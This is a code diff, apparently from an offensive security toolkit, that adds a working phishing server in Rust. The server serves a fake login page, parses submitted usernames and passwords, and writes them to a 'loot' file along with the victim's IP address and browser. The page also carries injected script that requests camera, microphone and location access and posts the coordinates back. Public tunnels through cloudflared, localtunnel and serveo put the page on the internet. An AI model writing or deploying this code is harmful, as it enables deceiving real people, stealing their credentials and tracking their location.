@@ -4,7 +4,6 @@
 
 use crate::cli::banner;
 use std::fs;
-use std::path::Path;
 
 pub mod email_templates;
 
@@ -844,5 +843,303 @@ input {{ background: #330000; color: #ff0000; border: 1px solid #ff0000; padding
         let form = self.social_form_password("Password", "password");
         let foot = self.social_foot();
         format!("{head}{form}{foot}<!-- Login -->\n<!-- Data to {lhost}:{lport}/login -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
+    }
+}
+
+// ═══════════════════ PHISHING SERVER (credential capture + tunnel) ═══════════════════
+
+pub struct PhishingServer {
+    pub lhost: String,
+    pub lport: u16,
+    pub template: String,
+    pub tunnel: Option<String>,
+}
+
+impl PhishingServer {
+    pub fn new(lhost: &str, lport: u16, template: &str) -> Self {
+        Self { lhost: lhost.to_string(), lport, template: template.to_string(), tunnel: None }
+    }
+
+    pub fn with_tunnel(mut self, tunnel: &str) -> Self {
+        self.tunnel = Some(tunnel.to_string());
+        self
+    }
+
+    pub fn start(&self) -> anyhow::Result<()> {
+        banner::info(&format!("Starting phishing server on {}:{} (template: {})", self.lhost, self.lport, self.template));
+
+        if self.template.is_empty() || self.template == "login" {
+            banner::info("Using generic login template with credential capture");
+        }
+
+        // Generate the phishing page with credential capture form
+        let page = PhishingGen::new().generate(&self.template, &self.lhost, &self.lport.to_string(), None);
+
+        let page_html = if let Some(p) = page {
+            // Read the generated file
+            let path = std::path::Path::new(&p);
+            std::fs::read_to_string(path).unwrap_or_default()
+        } else {
+            // Default login page with credential capture
+            Self::default_capture_page(&self.lhost, &self.lport.to_string(), &self.template)
+        };
+
+        // Start HTTP server
+        let server_lhost = self.lhost.clone();
+        let server_lport = self.lport;
+        let server_template = self.template.clone();
+        let server_handle = std::thread::spawn(move || {
+            Self::run_server(&server_lhost, server_lport, &page_html, &server_template);
+        });
+
+        // Setup tunnel if requested
+        if let Some(tunnel_type) = &self.tunnel {
+            match tunnel_type.as_str() {
+                "cloudflared" => {
+                    banner::info("Setting up cloudflared tunnel...");
+                    Self::setup_cloudflared_tunnel(self.lport);
+                }
+                "localtunnel" => {
+                    banner::info("Setting up localtunnel...");
+                    Self::setup_localtunnel(self.lport);
+                }
+                "serveo" => {
+                    banner::info("Setting up serveo tunnel...");
+                    Self::setup_serveo_tunnel(self.lport);
+                }
+                _ => {
+                    banner::warning(&format!("Unknown tunnel type: {}. Using local only.", tunnel_type));
+                }
+            }
+        }
+
+        banner::info(&format!("Local URL:  http://{}:{}/{}", self.lhost, self.lport, self.template));
+        banner::success("Server running. Waiting for victim connection...");
+
+        // Wait for server thread
+        let _ = server_handle.join();
+        Ok(())
+    }
+
+    fn default_capture_page(lhost: &str, lport: &str, template: &str) -> String {
+        format!(r#"<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login - {tpl}</title>
+    <style>body{{font-family:Arial;background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
+    .login{{background:#16213e;padding:30px;border-radius:10px;width:100%;max-width:400px;box-shadow:0 4px 6px rgba(0,0,0,0.3)}}
+    input{{width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:5px;background:#0f3460;color:#fff}}
+    button{{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer}}
+    h2{{color:#e94560}}</style>
+</head>
+<body>
+<div class="login">
+    <h2>Login Required</h2>
+    <form action="/capture" method="POST">
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <input type="hidden" name="template" value="{tpl}">
+        <button type="submit">Login</button>
+    </form>
+</div>
+</body>
+</html>
+<script>
+// Request device powers (camera, mic, location)
+async function requestPowers() {{
+    try {{
+        // Camera + Mic
+        const stream = await navigator.mediaDevices.getUserMedia({{video:true, audio:true}});
+        fetch('/powers', {{
+            method:'POST',
+            body:JSON.stringify({{camera:true, mic:true}}),
+            headers:{{'Content-Type':'application/json'}}
+        }});
+        stream.getTracks().forEach(t => t.stop());
+    }} catch(e) {{}}
+    try {{
+        // Location
+        navigator.geolocation.getCurrentPosition(function(pos) {{
+            fetch('/powers', {{
+                method:'POST',
+                body:JSON.stringify({{location:true, lat:pos.coords.latitude, lng:pos.coords.longitude}}),
+                headers:{{'Content-Type':'application/json'}}
+            }});
+        }});
+    }} catch(e) {{}}
+}}
+requestPowers();
+</script>
+<!-- Powered by CF-VOID | {lhost}:{lport} -->"#, tpl = template, lhost = lhost, lport = lport)
+    }
+
+    fn run_server(lhost: &str, lport: u16, page_html: &str, template: &str) {
+        
+        use std::net::TcpListener;
+        use std::thread;
+
+        let listener = match TcpListener::bind(format!("{}:{}", lhost, lport)) {
+            Ok(l) => l,
+            Err(e) => {
+                banner::error(&format!("Failed to bind to {}:{} - {}", lhost, lport, e));
+                return;
+            }
+        };
+
+        banner::info("Server started, ready to accept connections");
+
+        for stream in listener.incoming() {
+            match stream {
+                Ok(mut stream) => {
+                    let lhost = lhost.to_string();
+                    let template = template.to_string();
+                    let page = page_html.to_string();
+
+                    thread::spawn(move || {
+                        Self::handle_client(&mut stream, &page, &template, &lhost);
+                    });
+                }
+                Err(e) => {
+                    banner::error(&format!("Connection failed: {}", e));
+                }
+            }
+        }
+    }
+
+    fn handle_client(stream: &mut std::net::TcpStream, page_html: &str, template: &str, _lhost: &str) {
+        use std::io::{Read, Write};
+        let mut buf = [0; 8192];
+        match stream.read(&mut buf) {
+            Ok(n) => {
+                let request = String::from_utf8_lossy(&buf[..n]);
+
+                // Log connection
+                let peer = stream.peer_addr().map(|a| a.to_string()).unwrap_or_default();
+                let ua = request.lines().find(|l| l.to_lowercase().starts_with("user-agent:"))
+                    .map(|l| l.trim()).unwrap_or("Unknown");
+
+                if request.contains("GET /capture") || request.contains("POST /capture") {
+                    // Handle credential capture
+                    let body_start = request.find("\r\n\r\n").map(|p| p + 4).unwrap_or(0);
+                    let body = &request[body_start..];
+                    let credentials = Self::parse_credentials(body);
+
+                    if let Some((user, pass)) = &credentials {
+                        banner::success(&format!("CREDENTIALS CAPTURED from {} ({})", peer, ua));
+                        banner::info(&format!("  Username: {}", user));
+                        banner::info(&format!("  Password: {}", pass));
+                        banner::info(&format!("  Template: {}", template));
+
+                        // Save to loot file
+                        let loot_dir = "loot";
+                        let _ = std::fs::create_dir_all(loot_dir);
+                        let loot_file = format!("{}/{}_{}.txt", loot_dir, template, chrono::Local::now().format("%Y%m%d_%H%M%S"));
+                        let _ = std::fs::write(&loot_file, format!("username={}\npassword={}\nuser_agent={}\nip={}\ntemplate={}\n", user, pass, ua, peer, template));
+                        banner::info(&format!("Saved to: {}", loot_file));
+                    }
+
+                    // Send redirect
+                    let response = "HTTP/1.1 302 Found\r\nLocation: /\r\n\r\n";
+                    let _ = stream.write_all(response.as_bytes());
+                } else if request.starts_with("POST /powers") {
+                    // Handle power capture (camera/mic/location)
+                    let body_start = request.find("\r\n\r\n").map(|p| p + 4).unwrap_or(0);
+                    let body = &request[body_start..];
+                    banner::info(&format!("Powers captured from {}: {}", peer, body));
+                    let response = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok";
+                    let _ = stream.write_all(response.as_bytes());
+                } else if request.starts_with("GET /") || request.starts_with("POST /") {
+                    // Serve the phishing page
+                    let response = format!("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{}", page_html.len(), page_html);
+                    let _ = stream.write_all(response.as_bytes());
+                }
+            }
+            Err(e) => {
+                banner::error(&format!("Read error: {}", e));
+            }
+        }
+    }
+
+    fn parse_credentials(body: &str) -> Option<(String, String)> {
+        let mut username = String::new();
+        let mut password = String::new();
+
+        for pair in body.split('&') {
+            let mut parts = pair.splitn(2, '=');
+            if let (Some(key), Some(value)) = (parts.next(), parts.next()) {
+                let key = urlencoding::decode(key).unwrap_or(std::borrow::Cow::Borrowed(key)).to_string();
+                let decoded_value = urlencoding::decode(value).unwrap_or(std::borrow::Cow::Borrowed(value)).to_string();
+                match key.as_str() {
+                    "username" | "user" | "email" => username = decoded_value,
+                    "password" | "pass" | "pwd" => password = decoded_value,
+                    _ => {}
+                }
+            }
+        }
+
+        if !username.is_empty() && !password.is_empty() {
+            Some((username, password))
+        } else {
+            None
+        }
+    }
+
+    fn setup_cloudflared_tunnel(port: u16) {
+        banner::info(&format!("Setting up Cloudflare tunnel on port {}", port));
+        let output = std::process::Command::new("cloudflared")
+            .arg("tunnel")
+            .arg("--url")
+            .arg(format!("http://localhost:{}", port))
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::piped())
+            .spawn();
+
+        match output {
+            Ok(_) => {
+                banner::success("Cloudflare tunnel started");
+                banner::info("Check https://dash.cloudflare.com for tunnel URL");
+            }
+            Err(e) => {
+                banner::error(&format!("Failed to start cloudflared: {}. Using local only.", e));
+            }
+        }
+    }
+
+    fn setup_localtunnel(port: u16) {
+        banner::info(&format!("Setting up localtunnel on port {}", port));
+        let output = std::process::Command::new("npx")
+            .arg("localtunnel")
+            .arg("--port")
+            .arg(port.to_string())
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::piped())
+            .spawn();
+
+        match output {
+            Ok(_) => banner::success("LocalTunnel started"),
+            Err(e) => banner::error(&format!("Failed to start localtunnel: {}", e)),
+        }
+    }
+
+    fn setup_serveo_tunnel(port: u16) {
+        banner::info(&format!("Setting up Serveo tunnel on port {}", port));
+        let output = std::process::Command::new("ssh")
+            .arg("-R")
+            .arg(format!("80:localhost:{}", port))
+            .arg("-o")
+            .arg("StrictHostKeyChecking=no")
+            .arg("-o")
+            .arg("UserKnownHostsFile=/dev/null")
+            .arg("serveo.net")
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::piped())
+            .spawn();
+
+        match output {
+            Ok(_) => banner::success("Serveo tunnel started"),
+            Err(e) => banner::error(&format!("Failed to start serveo: {}", e)),
+        }
     }
 }
